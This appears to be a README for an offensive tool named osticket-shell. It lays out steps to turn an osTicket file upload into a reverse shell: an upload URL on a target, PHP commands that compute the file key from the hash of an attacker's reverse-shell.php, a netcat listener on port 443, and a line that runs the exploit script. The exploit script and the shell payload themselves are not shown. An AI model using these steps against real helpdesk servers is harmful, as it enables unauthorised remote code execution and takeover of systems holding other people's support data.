# osticket-shell

## osticket file upload to reverse shell

* After uploading file
	* `http://target/file.php?key=t4hjgruq3xmgvta0gr8vm9nf5hjyykfui&expires=111111400&signature=f03c2714xxd8f914xxh6de56bd96xx147646683&id=17`

* copy key
	* `t4hjgruq3xmgvta0gr8vm9nf5hjyykfui`

* File key
	* `secrule@ubuntu:~$ php -a `                                  
	* `php > $sha1 = base64_encode(sha1_file('/opt/reverse-shell.php', true));` < path shell | Attacker machine
	* `php > print(str_replace(array('=','+','/'), array('','-','_'), $sha1));`                                                               
	* `output: rUQ3xMGvtA0sn8vM9nf5OQdkFuI`

* listen netcat
	* `nc -lvp 443`

# Usage
`./osticket_shell.sh`
